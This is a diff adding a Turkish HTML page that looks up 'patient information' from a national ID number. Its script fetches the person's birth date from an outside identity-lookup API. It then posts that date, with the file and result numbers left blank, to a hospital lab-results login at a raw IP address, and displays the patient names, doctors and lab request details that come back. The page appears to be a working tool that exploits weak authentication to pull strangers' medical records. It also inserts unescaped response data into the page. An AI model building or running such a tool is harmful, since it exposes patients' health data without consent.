@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hasta Bilgileri Sorgulama</title>
+    <style>
+        #result, #errorMessage {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<h2>Hasta Bilgileri Sorgulama</h2>
+<label for="tcNo">TC Kimlik Numarası:</label>
+<input type="text" id="tcNo" placeholder="TC Kimlik No">
+<button onclick="sorgula()">Sorgula</button>
+
+<p id="errorMessage" style="color: red;"></p>
+<div id="result"></div>
+
+<script>
+async function sorgula() {
+    const tcNo = document.getElementById("tcNo").value;
+    const errorMessageElement = document.getElementById("errorMessage");
+    const resultElement = document.getElementById("result");
+
+    errorMessageElement.style.display = "none";
+    resultElement.style.display = "none";
+
+    if (!tcNo) {
+        errorMessageElement.textContent = "Lütfen bir TC kimlik numarası girin.";
+        errorMessageElement.style.display = "block";
+        return;
+    }
+
+    try {
+        // İlk API'ye TC ile istek yap
+        const firstApiUrl = `https://api.sowixvip.xyz/sowixapi/tcpro.php?tc=${tcNo}`;
+        const firstResponse = await fetch(firstApiUrl);
+        const firstData = await firstResponse.json();
+
+        if (!firstData.success) {
+            errorMessageElement.textContent = "Veri bulunamadı.";
+            errorMessageElement.style.display = "block";
+            return;
+        }
+
+        // Doğum tarihini al
+        const birthDate = firstData.data.DOGUMTARIHI;
+
+        // İkinci API'ye gerekli bilgileri gönder
+        const apiUrl = "http://95.0.185.19:64428/online-web/onlinelbs/checkLogin.html";
+        const payload = new URLSearchParams({
+            OnlineLbsDosyaNo: '',
+            OnlineLbsDogumTarihi: birthDate,
+            OnlineLbsSonucNo: ''
+        });
+
+        const secondResponse = await fetch(apiUrl, {
+            method: "POST",
+            body: payload
+        });
+
+        const secondData = await secondResponse.json();
+
+        if (secondData.durum === "ok") {
+            let resultHtml = "<h2>Hasta Bilgileri:</h2>";
+            secondData.data.forEach(item => {
+                resultHtml += `
+                    <p><strong>TC Kimlik No:</strong> ${item.tckimlikNo || 'Bilgi Yok'}</p>
+                    <p><strong>Kurum ID:</strong> ${item.kurumId || 'Bilgi Yok'}</p>
+                    <p><strong>Kullanıcı Kodu:</strong> ${item.kullaniciKodu || 'Bilgi Yok'}</p>
+                    <p><strong>Lab İstek ID:</strong> ${item.labIstekId || 'Bilgi Yok'}</p>
+                    <p><strong>Genel Kurum ID:</strong> ${item.genKurumId || 'Bilgi Yok'}</p>
+                    <p><strong>Açıklama:</strong> ${item.aciklama || 'Bilgi Yok'}</p>
+                    <p><strong>Birim Adı:</strong> ${item.birimAdi || 'Bilgi Yok'}</p>
+                    <p><strong>Doğum Tarihi:</strong> ${item.dogumTarihi || 'Bilgi Yok'}</p>
+                    <p><strong>İsteyen Kullanıcı ID:</strong> ${item.isteyenKullaniciId || 'Bilgi Yok'}</p>
+                    <p><strong>Hasta Adı Soyadı:</strong> ${item.hastaAdiSoyadi || 'Bilgi Yok'}</p>
+                    <p><strong>Doktor Adı:</strong> ${item.doktorAdi || 'Bilgi Yok'}</p>
+                    <hr>`;
+            });
+            resultElement.innerHTML = resultHtml;
+            resultElement.style.display = "block";
+        } else {
+            errorMessageElement.textContent = "Veri alınamadı.";
+            errorMessageElement.style.display = "block";
+        }
+    } catch (error) {
+        errorMessageElement.textContent = "Bir hata oluştu: " + error.message;
+        errorMessageElement.style.display = "block";
+    }
+}
+</script>
+
+</body>
+</html>
